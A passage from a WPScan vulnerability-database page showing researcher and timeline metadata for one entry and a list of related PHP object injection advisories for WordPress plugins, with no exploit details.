### Miscellaneous

Original Researcher
Chloe Chamberland

Submitter
Chloe Chamberland

Submitter website
<https://wordfence.com>

Submitter twitter
[infosecchloe](//twitter.com/infosecchloe)

Verified
Yes

WPVDB ID
[509f2754-a1a1-4142-9126-ae023a88533a](https://a8cteam5105.wordpress.com/vulnerability/509f2754-a1a1-4142-9126-ae023a88533a/)

### Timeline

Publicly Published
2021-03-25 (about 3 years ago)

Added
2021-03-25 (about 3 years ago)

Last Updated
2021-03-26 (about 3 years ago)

### Other

Published
Title

Published
2023-01-18
Title
[MainWP Code Snippets Extension < 4.0.3 - Subscriber+ PHP Objection Injection](https://a8cteam5105.wordpress.com/vulnerability/48710ddb-1f8e-4849-b8ba-764374b11fb3/)

Published
2024-04-10
Title
[WordPress Geo Controller < 8.6.5 - PHP Object Injection](https://a8cteam5105.wordpress.com/vulnerability/f85d8b61-eaeb-433c-b857-06ee4db5c7d5/)

Published
2024-11-13
Title
[AJAX Random Posts <= 0.3.3 - Unauthenticated PHP Object Injection](https://a8cteam5105.wordpress.com/vulnerability/6df089a8-f29a-4a67-a506-693c16684de9/)

Published
2018-08-29
Title
[WooCommerce <= 3.4.4 - Potential Object Injection](https://a8cteam5105.wordpress.com/vulnerability/13a534b4-97bd-48e1-b936-cc57c9c56396/)

Published
2020-11-05
Title
[Welcart e-Commerce < 1.9.36 - Authenticated PHP Object Injection](https://a8cteam5105.wordpress.com/vulnerability/177acb3e-b7a2-4a86-9808-4b90d1dbe146/)

![](https://wpscan.com/wp-content/uploads/2023/10/wpscan-logo-dark.png?w=246)

### Vulnerabilities

* [WordPress](/wordpresses)
* [Plugins](/plugins)
* [Themes](/themes)
* [Our Stats](https://a8cteam5105.wordpress.com/statistics/)
* [Submit vulnerabilities](https://a8cteam5105.wordpress.com/submit/)

#### About

* [How it works](/features)
* [Pricing](/pricing)
* [WordPress plugin](https://wordpress.org/plugins/wpscan/)
* [Blog](/blog)
* [Contact](/contact)

#### For Developers

* [Status](https://status.wpscan.com/)
* [API details](/api)
* [CLI scanner](/wordpress-cli-scanner)

#### Other

* [Privacy](https://automattic.com/privacy/)
* [Terms of service](/terms)
* [Submission terms](/submission-terms/)
* [Disclosure policy](/vulnerability-disclosure-policy)
* [Privacy Notice for California Users](https://automattic.com/privacy/#california-consumer-privacy-act-ccpa)

---

![](https://wpscan.com/wp-content/uploads/2023/08/frame-1323.png?w=48)

In partnership with [Jetpack](https://jetpack.com/)

* [GitHub](https://github.com/wpscanteam/wpscan/)
* [Twitter](https://twitter.com/_wpscan_)
* [Facebook](https://www.facebook.com/WPScan)

---

An

![](https://wpscan.com/wp-content/uploads/2023/08/autpmattic-logo.png?w=298)

endeavor

[Work With Us](https://automattic.com/work-with-us/)

[Press](https://automattic.com/press/)

* Subscribe
  Subscribed

  + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)

  Join 30,404 other subscribers

  Sign me up

  + Already have a WordPress.com account? [Log in now.](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
* Privacy
* + [![](https://wpscan.com/wp-content/uploads/2023/08/cropped-83c25-favicon.png?w=50) WPScan](https://wpscan.com)
  + Subscribe
    Subscribed
  + [Sign up](https://wordpress.com/start/)
  + [Log in](https://wordpress.com/log-in?redirect_to=https%3A%2F%2Fr-login.wordpress.com%2Fremote-login.php%3Faction%3Dlink%26back%3Dhttps%253A%252F%252Fwpscan.com%252Fblog%252Funauthorized-plugin-installation-activation-in-hunk-companion%252F)
  + [Report this content](https://wordpress.com/abuse/?report_url=https://wpscan.com)
  + [View site in Reader](https://wordpress.com/read/feeds/156197069)
  + [Manage subscriptions](https://subscribe.wordpress.com/)
  + Collapse this bar

![](https://pixel.wp.com/b.gif?v=noscript)

